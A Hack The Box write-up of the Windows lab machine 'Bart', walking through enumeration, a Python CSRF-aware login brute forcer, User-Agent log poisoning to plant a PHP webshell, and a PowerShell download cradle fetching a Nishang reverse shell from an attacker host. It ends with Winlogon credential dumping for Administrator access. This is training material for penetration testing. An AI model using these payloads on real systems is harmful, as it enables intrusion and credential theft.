---
title: HTB: Bart
url: https://0xdf.gitlab.io/2018/07/15/htb-bart.html
date: 2018-07-15T15:52:03+00:00
difficulty: Medium [30]
os: Windows
tags: hackthebox, htb-bart, ctf, nmap, gobuster, wfuzz, cewl, bruteforce, log-poisoning, php, webshell, nishang, winlogon, powershell-run-as, oscp-plus-v1
---

Bart starts simple enough, only listening on port 80. Yet it ends up providing a path to user shell that requires enumeration of two different sites, bypassing two logins, and then finding a file upload / LFI webshell. The privesc is relateively simple, yet I ran into an interesting issue that caused me to miss it at first. Overall, a fun box with lots to play with.

## Box Info

| Name | [Bart](https://hackthebox.com/machines/bart)  [Bart](https://hackthebox.com/machines/bart) [Play on HackTheBox](https://hackthebox.com/machines/bart) |
| --- | --- |
| Release Date | 24 Feb 2018 |
| Retire Date | 04 May 2024 |
| OS | Windows Windows |
| Base Points | Medium [30] |
| Rated Difficulty | Rated difficulty for Bart |
| Radar Graph | Radar chart for Bart |
| First Blood User | 05:01:52[echthros echthros](https://app.hackthebox.com/users/2846) |
| First Blood Root | 04:53:33[echthros echthros](https://app.hackthebox.com/users/2846) |
| Creator | [mrh4sh mrh4sh](https://app.hackthebox.com/users/2570) |

## nmap

nmap shows only 80 open:

```

root@kali# mkdir nmap; nmap -sT -p- --min-rate 5000 -oA nmap/alltcp 10.10.10.81
Starting Nmap 7.70 ( https://nmap.org ) at 2018-04-26 15:44 EDT
Nmap scan report for 10.10.10.81
Host is up (0.098s latency).
Not shown: 65534 filtered ports
PORT   STATE SERVICE
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 39.78 seconds
root@kali# nmap -sC -sV -p 80 -oA nmap/initial 10.10.10.81
Starting Nmap 7.70 ( https://nmap.org ) at 2018-04-26 15:46 EDT
Nmap scan report for 10.10.10.81
Host is up (0.099s latency).

PORT   STATE SERVICE VERSION
80/tcp open  http    Microsoft IIS httpd 10.0
| http-methods:
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: Did not follow redirect to http://forum.bart.htb/
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 9.64 seconds

```

## port 80 - website

### Visiting the Site

Visiting `http://10.10.10.81` responds with a redirect to `forum.bart.htb`, which just fails to resolve.

Add it to `/etc/hosts`, and try again.

```

root@kali# grep bart /etc/hosts
10.10.10.81     bart.htb forum.bart.htb

```

Now on load:
![forum](https://0xdfimages.gitlab.io/img/forum.bart.htb.jpg)

Site says “powered by wordpress”, but looking at the source, it appears to be a static site.

There isn’t much here, but we do find a handful of potential usernames, including a user who is commented out. We’ll use that later.

### Further Enumeration

With only a static site, we’ll enumerate further, for both bart.htb and forum.htb to see what we can find.

#### gobuster on forum.bart.htb

`gobuster` on `forum.bart.htb` returns nothing:

```

root@kali# gobuster -u http://forum.bart.htb -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x txt,asp,aspx,html

Gobuster v1.4.1              OJ Reeves (@TheColonial)
=====================================================
=====================================================
[+] Mode         : dir
[+] Url/Domain   : http://forum.bart.htb/
[+] Threads      : 10
[+] Wordlist     : /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Status codes : 204,301,302,307,200
[+] Extensions   : .txt,.asp,.aspx,.html
=====================================================
/index.html (Status: 200)
/Index.html (Status: 200)
/INDEX.html (Status: 200)

```

#### gobuster on bart.htb

`gobuster` isn’t useful because any ‘t exist returns an image:

```

root@kali# gobuster -u http://bart.htb -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x txt,asp,aspx,html

Gobuster v1.4.1              OJ Reeves (@TheColonial)
=====================================================
=====================================================
[+] Mode         : dir
[+] Url/Domain   : http://bart.htb/
[+] Threads      : 10
[+] Wordlist     : /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Status codes : 200,204,301,302,307
[+] Extensions   : .txt,.asp,.aspx,.html
=====================================================
[-] Wildcard response found: http://bart.htb/99a4ed2e-443c-42e8-a750-e8aef7a8d6a0 => 200
[-] To force processing of Wildcard responses, specify the '-fw' switch.
=====================================================

```

![1531014411128](https://0xdfimages.gitlab.io/img/1531014411128.png)

#### wfuzz to Enumerate

Switch to wfuzz to allow filtering by response length:

```

root@kali# wfuzz -c -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt --hh 158607 http://bart.htb/FUZZ
********************************************************
* Wfuzz 2.2.9 - The Web Fuzzer                         *
********************************************************

Target: http://bart.htb/FUZZ
Total requests: 220560

==================================================================
ID      Response   Lines      Word         Chars          Payload
==================================================================

000001:  C=302      0 L        0 W            0 Ch        "# directory-list-2.3-medium.txt"
000002:  C=302      0 L        0 W            0 Ch        "#"
000009:  C=302      0 L        0 W            0 Ch        "# Suite 300, San Francisco, California, 94105, USA."
000003:  C=302      0 L        0 W            0 Ch        "# Copyright 2007 James Fisher"
000004:  C=302      0 L        0 W            0 Ch        "#"
000005:  C=302      0 L        0 W            0 Ch        "# This work is licensed under the Creative Commons"
000006:  C=302      0 L        0 W            0 Ch        "# Attribution-Share Alike 3.0 License. To view a copy of this"
000007:  C=302      0 L        0 W            0 Ch        "# license, visit http://creativecommons.org/licenses/by-sa/3.0/"
000008:  C=302      0 L        0 W            0 Ch        "# or send a letter to Creative Commons, 171 Second Street,"
000010:  C=302      0 L        0 W            0 Ch        "#"
000011:  C=302      0 L        0 W            0 Ch        "# Priority ordered case sensative list, where entries were found"
000067:  C=301      1 L       10 W          145 Ch        "forum"
001614:  C=301      1 L       10 W          147 Ch        "monitor"
002385:  C=301      1 L       10 W          145 Ch        "Forum"
019837:  C=301      1 L       10 W          147 Ch        "Monitor"
045240:  C=302      0 L        0 W            0 Ch        ""
217693:  C=301      1 L       10 W          147 Ch        "MONITOR"
000012:  C=302      0 L        0 W            0 Ch        "# on atleast 2 different hosts"
000013:  C=302      0 L        0 W            0 Ch        "#"
000014:  C=302      0 L        0 W            0 Ch        ""

Total time: 12219.20
Processed Requests: 220560
Filtered Requests: 220540
Requests/sec.: 18.05027

```

`/forum` seems to be the forum site.

The monitor path is interesting.

### monitor.bart.htb

#### Overview

It turns out that just as `/forum` and `forum.bart.htb` are the same page, `/monitor` and `monitor.bart.htb` also are the same.

`http://monitor.bart.htb/`:
![monitor](https://0xdfimages.gitlab.io/img/monitor-bart.htb.png)

There’s a forgot password page:

`http://monitor.bart.htb/?action=forgot`:
![monitor forgot pass](https://0xdfimages.gitlab.io/img/monitor-forgot-bart.htb.png)

#### Account Identification

On the forgot password page, it will tell you if the email doesn’t exist. So we can use that to reveal usernames for the system.

There are 5 employees referenced on the `forum.bart.htb` page:

| Name | Email | Position | reference |
| --- | --- | --- | --- |
| Samantha Brown | s.brown@bart.local | CEO@BART | `Our Team` |
| Daniel Simmons | d.simmons@bart.htb | Head of Sales | `Our Team` |
| Robert Hilton | r.hilton@bart.htb | Head of IT | `Our Team` |
| Harvey Potter | h.potter@bart.htb | Developer@BART | `Our Team`, commented out |
| Daniella Lamborghini | d.lamborghini@bart.htb (guess?) | Head of Recruitment | `News` |

Trying their emails, emails without domain, and other names finally reveals an account:
![harvey](https://0xdfimages.gitlab.io/img/monitor-forgot-harvey-bart.htb.png)

#### Brute Forcing Harvey’s Account:

After a few guesses that were unsuccessful, I opted to used cewl to get a wordlist from the page:

```

root@kali# cewl -w cewl-forum.txt -e -a http://forum.bart.htb
CeWL 5.3 (Heading Upwards) Robin Wood (robin@digi.ninja) (https://digi.ninja/)

```

Then I decided to write a brute forcer in python since I needed to get around csrf tokens (script included at end), and it found a password:

```

root@kali# python3 brute_monitor_login.py cewl-forum.txt
|==>                            |               99/1028
[+] Found password: potter

```

And, it worked!
![logged in](https://0xdfimages.gitlab.io/img/monitor-logged-in-bart.htb.png)

Clicking on the `Internal Chat` box, there’s details:
![chat](https://0xdfimages.gitlab.io/img/monitor-chat-bart.htb.png)

This reveals another subdomain: `http://internal-01.bart.htb`

### internal-01.bart.htb

This site just gives a login page (which is a redirect from the root to `http://internal-01.bart.htb/simple_chat/login_form.php`):
![internal](https://0xdfimages.gitlab.io/img/login-internal-01.bart.htb.png)

#### gobuster

Both the root and the `simple_chat` path don’t give much to work with:

```

root@kali# gobuster -u http://internal-01.bart.htb/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x txt,html,php

Gobuster v1.4.1              OJ Reeves (@TheColonial)
=====================================================
=====================================================
[+] Mode         : dir
[+] Url/Domain   : http://internal-01.bart.htb/
[+] Threads      : 10
[+] Wordlist     : /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Status codes : 301,302,307,200,204
[+] Extensions   : .txt,.html,.php
=====================================================
/index.php (Status: 302)
/log (Status: 301)
/Index.php (Status: 302)
/sql (Status: 301)
/INDEX.php (Status: 302)
/SQL (Status: 301)
/Log (Status: 301)

```

```

root@kali# gobuster -u http://internal-01.bart.htb/simple_chat -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x txt,php,html

Gobuster v1.4.1              OJ Reeves (@TheColonial)
=====================================================
=====================================================
[+] Mode         : dir
[+] Url/Domain   : http://internal-01.bart.htb/simple_chat/
[+] Threads      : 10
[+] Wordlist     : /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Status codes : 307,200,204,301,302
[+] Extensions   : .txt,.php,.html
=====================================================
/index.php (Status: 302)
/login.php (Status: 302)
/register.php (Status: 302)
/media (Status: 301)
/chat.php (Status: 302)
/css (Status: 301)
/includes (Status: 301)
/Index.php (Status: 302)
/Login.php (Status: 302)
/js (Status: 301)
/logout.php (Status: 302)
/Media (Status: 301)
/Register.php (Status: 302)
/login_form.php (Status: 200)
/Chat.php (Status: 302)
/INDEX.php (Status: 302)
/CSS (Status: 301)
/JS (Status: 301)
/Logout.php (Status: 302)
/MEDIA (Status: 301)
/Includes (Status: 301)

```

#### Use the Source / Logging in

The source code for the chat server is on github:
https://github.com/magkopian/php-ajax-simple-chat

Looking at the code, it looks like the version running here removed the `register_form.php` page, and the link to it from the `login_form.php` page.

Still, `register_form.php` posts to `register.php`, which we saw in the `gobuster` results above.

We’ll use curl to create an account and get access to the site:

```

root@kali# curl -X POST http://internal-01.bart.htb/simple_chat/register.php -d "uname=0xdf&passwd=password"

```

And we’re in:
![1531016599664](https://0xdfimages.gitlab.io/img/1531016599664.png)

#### Log Poisoning

Looking at the source, there’s some added code compared to the github repo:

```

<div id="log_link">
  <script>
    function saveChat() {
      // create a serialized object and send to log_chat.php. Once done the XHR request, alert "Done"
    var xhr = new XMLHttpRequest();
    xhr.onreadystatechange = function() {
        if (xhr.readyState == XMLHttpRequest.DONE) {
            alert(xhr.responseText);
        }
    }
    xhr.open('GET', 'http://internal-01.bart.htb/log/log.php?filename=log.txt&username=harvey', true);
    xhr.send(null);
    alert("Done");
    }
  </script>
  <a href="#" onclick="saveChat()">Log</a>
</div>

```

When the user clicks the `Log` link, there’s a popup saying “Done”, and then one saying “1”. That’s because the `xhr.open` function is called with the 3rd parameter `true`, which sets the call to async mode. The script then alerts “Done”, and then, when the http request comes back, the xhr.onreadystatechange function is called, which alerts with the response text.

Checking out the url that’s being called, if viewed directly, it outputs just the number 1, as seen in the popup.

If you change the file parameter to a file that already exists and we can’t write over (like the page source), it returns 0. Also, if you change it to a user that doesn’t exist, it returns 0. What about the file? Turns out that file is available in the same directory:

```

[2018-02-21 22:35:17] - harvey - Mozilla/5.0 (X11; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0

```

Each time someone visits `log.php`, it appears to record the time, the username argument, and their useragent string.

So let’s see if we can get execution by writing to phpinfo.php with useragent `<?php phpinfo(); ?>`.

```

root@kali# python3
Python 3.6.5rc1 (default, Mar 14 2018, 06:54:23)
[GCC 7.3.0] on linux
Type "help", "copyright", "credits" or "license" for more information.
>>> import requests
>>> proxies={'http':'http://127.0.0.1:8080'}
>>> headers={'User-Agent':'0xdf: <?php phpinfo(); ?>'}
>>> r = requests.get('http://internal-01.bart.htb/log/log.php?filename=phpinfo.php&username=harvey', proxies=proxies, headers=headers)

```

Then visit `http://internal-01.bart.htb/log/phpinfo.php`:
![phpinfo](https://0xdfimages.gitlab.io/img/phpinfo-internal-01.bart.htb.png)

#### PHP Webshell

So a webshell is possible:

```

>>> headers={'User-Agent':"0xdf: <?php system($_REQUEST['cmd']); ?>"}
>>> r = requests.get('http://internal-01.bart.htb/log/log.php?filename=0xdf.php&username=harvey', proxies=proxies, headers=headers)

```

```

root@kali# curl http://internal-01.bart.htb/log/0xdf.php?cmd=whoami
[2018-04-28 22:55:12] - harvey - 0xdf: nt authority\iusr

```

#### Nishang Invoke-PowerShellTcp Shell

Time for a real shell. Grab `Invoke-PowerShellTcp.ps1` from [Nishang](https://github.com/samratashok/nishang), and add a line to the end:

```

root@kali# cp /opt/powershell/nishang/Shells/Invoke-PowerShellTcp.ps1 .
root@kali# tail -1 Invoke-PowerShellTcp.ps1
Invoke-PowerShellTcp -Reverse -IPAddress 10.10.15.48 -Port 4444

```

Give webshell powershell to get interactive shell and run it, and get shell:

```

>>> cmd = "powershell IEX(New-Object Net.WebClient).downloadString('http://10.10.15.48:8083/Invoke-PowerShellTcp.ps1')"
>>> r = requests.get('http://internal-01.bart.htb/log/0xdf.php?cmd={}'.format(cmd), proxies=proxies)

```

```

root@kali# python -m SimpleHTTPServer 8083
Serving HTTP on 0.0.0.0 port 8083 ...
10.10.10.81 - - [28/Apr/2018 16:09:12] "GET /Invoke-PowerShellTcp.ps1 HTTP/1.1" 200 -

```

```

root@kali# nc -lnvp 4444
listening on [any] 4444 ...
connect to [10.10.15.48] from (UNKNOWN) [10.10.10.81] 49673
Windows PowerShell running as user BART$ on BART
Copyright (C) 2015 Microsoft Corporation. All rights reserved.

PS C:\inetpub\wwwroot\internal-01\log>whoami
nt authority\iusr

```

## Privesc: iusr -> Administrator

### Creds in Winlogon

Walking through some [standard Windows privesc checks](https://www.sploitspren.com/2018-01-26-Windows-Privilege-Escalation-Guide/), I eventually found default credentials stored in the registry for autologon. When I queried that out of the nishang shell, I didn’t find the password. See section at end about trouble shooting this.

To get it to work, uploaded nc64.exe, and got a fresh 64bit shell, and I was able to dump credentials from the registry:

```

C:\inetpub\wwwroot\internal-01\log>reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" 2>nul | findstr "DefaultUserName DefaultDomainName DefaultPassword"
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" 2>nul | findstr "DefaultUserName DefaultDomainName DefaultPassword"
    DefaultDomainName    REG_SZ    DESKTOP-7I3S68E
    DefaultUserName    REG_SZ    Administrator
    DefaultPassword    REG_SZ    3130438f31186fbaf962f407711faddb

```

### Using Credentials to Get administrator Access

There a several different ways to use these credentials to get access to administrator files (such as the flag). I’ll show two, `run_as` and `net use`:

#### powershell “run as”

Use the password to create a credential that can be passed to `Invoke-Command`. In this case, `shell.ps1` is another `Invoke-PowerShellTcp.ps1` with the port changed to 5555:

```

PS C:\inetpub\wwwroot\internal-01\log> $username = "BART\Administrator"
PS C:\inetpub\wwwroot\internal-01\log> $password = "3130438f31186fbaf962f407711faddb"
PS C:\inetpub\wwwroot\internal-01\log> $secstr = New-Object -TypeName System.Security.SecureString
PS C:\inetpub\wwwroot\internal-01\log> $password.ToCharArray() | ForEach-Object {$secstr.AppendChar($_)}
PS C:\inetpub\wwwroot\internal-01\log> $cred = new-object -typename System.Management.Automation.PSCredential -argumentlist $username, $secstr
PS C:\inetpub\wwwroot\internal-01\log> Invoke-Command -ScriptBlock { IEX(New-Object Net.WebClient).downloadString('http://10.10.15.48:8083/shell.ps1') } -Credential $cred -Computer localhost

```

```

root@kali# nc -lnvp 5555
listening on [any] 5555 ...
connect to [10.10.15.48] from (UNKNOWN) [10.10.10.81] 50593
Windows PowerShell running as user Administrator on BART
Copyright (C) 2015 Microsoft Corporation. All rights reserved.

PS C:\Users\Administrator\Documents>whoami
bart\administrator

```

#### net use

Just gets access to the filesystem, but that’s all that is needed to get the flags:

```

PS HKLM:\software\microsoft\windows nt\currentversion\winlogon> net use x: \\localhost\c$ /user:administrator 3130438f31186fbaf962f407711faddb
The command completed successfully.

PS HKLM:\software\microsoft\windows nt\currentversion\winlogon> x:
PS X:\> cd users\administrator\desktop
PS X:\users\administrator\desktop> ls

    Directory: X:\users\administrator\desktop

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----       11/02/2018     12:51             32 root.txt

```

### user.txt and root.txt

With admin shell, can grab both flags:

```

PS C:\Users\Administrator\Documents> cat C:\users\h.potter\user.txt
625b6c7a...
PS C:\Users\Administrator\Documents> cat C:\users\Administrator\Desktop\root.txt
0074a38e...

```

## Beyond Root

### brute forcer source

`brute_monitor_login.py`:

```

#!/usr/bin/env python3

import re
import requests
import sys
from multiprocessing import Pool

MAX_PROC = 50
url = "http://monitor.bart.htb/"
username = "harvey"

#<input type="hidden" name="csrf" value="aab59572a210c4ee1f19ab55555a5d829e78b8efdbecd4b2f68bd485d82f0a57" />
csrf_pattern = re.compile('name="csrf" value="(\w+)" /')

def usage():
    print("{} [wordlist]".format(sys.argv[0]))
    print("  wordlist should be one word per line]")
    sys.exit(1)

def check_password(password):

    # get csrf token and PHPSESSID
    r = requests.get(url)
    csrf = re.search(csrf_pattern, r.text).group(1)
    PHPSESSID = [x.split('=')[1] for x in r.headers['Set-Cookie'].split(';') if x.split('=')[0] == 'PHPSESSID'][0]

    # try login:
    data = {"csrf": csrf,
            "user_name": username,
            "user_password": password,
            "action": "login"}
    proxies = {'http': 'http://127.0.0.1:8080'}
    headers = {'Cookie': "PHPSESSID={}".format(PHPSESSID)}
    r = requests.post(url, data=data, proxies=proxies, headers=headers)

    if '<p>The information is incorrect.</p>' in r.text:
        return password, False
    else:
        return password, True

def main(wordlist, nprocs=MAX_PROC):
    with open(wordlist, 'r', encoding='latin-1') as f:
       words = f.read().rstrip().replace('\r','').split('\n')

    words = [x.lower() for x in words] + [x.capitalize() for x in words] + words + [x.upper() for x in words]

    pool = Pool(processes=nprocs)

    i = 0
    print_status(0, len(words))
    for password, status in pool.imap_unordered(check_password, [pass_ for pass_ in words]):
        if status:
            sys.stdout.write("\n[+] Found password: {} \n".format(password))
            pool.terminate()
            sys.exit(0)
        else:
            i += 1
            print_status(i, len(words))

    print("\n\nPassword not found\n")

def print_status(i, l, max=30):
    sys.stdout.write("\r|{}>{}|  {:>15}/{}".format( "=" * ((i*max)//l), " " * (max - ((i*max)//l)), i, l))

if __name__ == '__main__':
    if len(sys.argv) != 2:
        usage()
    main(sys.argv[1])

```

### Issues with Shells and Getting WinLogon Creds

Originally, I got on with my standard Nishang `Invoke-PowerShellTcp.ps1` shell, and when I checked for winlogon creds, there were none there:

```

PS HKLM:\software\microsoft\windows nt\currentversion\winlogon> whoami
nt authority\iusr
PS HKLM:\software\microsoft\windows nt\currentversion\winlogon> get-itemproperty .

DefaultDomainName       :
DefaultUserName         :
EnableSIHostIntegration : 1
PreCreateKnownFolders   : {A520A1A4-1780-4FF6-BD18-167343C5AF16}
Shell                   : explorer.exe
ShellCritical           : 0
SiHostCritical          : 0
SiHostReadyTimeOut      : 0
SiHostRestartCountLimit : 0
SiHostRestartTimeGap    : 0
PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHIN
                          E\software\microsoft\windows
                          nt\currentversion\winlogon
PSParentPath            : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHIN
                          E\software\microsoft\windows nt\currentversion
PSChildName             : winlogon
PSDrive                 : HKLM
PSProvider              : Microsoft.PowerShell.Core\Registry

```

My shell loads as a 32-bit process:

```

PS C:\> [Environment]::Is64BitProcess
False

```

That’s because `php-cgi` is running as a 32-bit process, as shown by the `Get-32BitProcess` function as defined [here](https://stackoverflow.com/a/43773871):

```

PS C:\> IEX(New-Object Net.WebClient).downloadString('http://10.10.16.17:8888/process_arc.ps1')
PS C:\>Get-32BitProcess

Handles  NPM(K)    PM(K)      WS(K)     CPU(s)     Id  SI ProcessName          
-------  ------    -----      -----     ------     --  -- -----------          
     58       4     2240       3524       0.00   2668   0 cmd                  
    435      29     8636      29692       0.69   6984   1 OneDrive             
    196      12     3376       9804       0.02    936   1 OneDriveStandalone...
    116      14     6296      11844       0.17   6972   0 php-cgi              
    664      47    48864      60688       3.31   2764   0 powershell  

```

Thanks to InvertedClimbing for the help on that one.

I played with things to try to force it into a 64-bit process (without using Metasploit to migrate), but was unable to. Eventually, I used `nc64.exe` to get a 64-bit shell, and was able to get the credentials. It was a good lesson learned to always check the arch of your shell process.